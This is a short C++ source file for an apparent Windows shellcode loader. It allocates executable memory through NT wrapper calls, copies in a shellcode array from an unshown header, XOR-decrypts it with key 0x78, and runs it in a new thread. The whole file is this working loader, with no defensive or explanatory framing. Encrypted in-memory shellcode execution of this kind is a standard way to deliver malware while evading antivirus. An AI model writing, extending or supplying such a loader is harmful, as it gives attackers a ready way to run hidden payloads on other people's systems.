#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <vector>
#include <defines.hpp>
#include <funcs.hpp>




int main()
{
    std::cout << "[+] Starting Loader!" << std::endl;

    std::cout << "[+] Allocating memory!" << std::endl;

    uintptr_t Addr = Nt::VirtualAllocCaller(sizeof(Shellcode), PAGE_EXECUTE_READWRITE);

    std::cout << "[+] Writting shellcode..." << std::endl;

    for (size_t i = 0; i < sizeof(Shellcode); i++) {
        ((unsigned char*)Addr)[i] = Shellcode[i];
    }

    std::cout << "[+] Decrypting shellcode..." << std::endl;

    Funcs::Xor((unsigned char*)Addr, sizeof(Shellcode), 0x78);

    std::cout << "[+] Creating thread" << std::endl;

    HANDLE HThread = Nt::CreateThreadCaller(GetCurrentProcess(), (LPVOID)Addr, NULL);

    std::cout << "[+] Done!" << std::endl;

    Nt::WaitForSingleObjectCaller(HThread);
    system("pause"); 
}

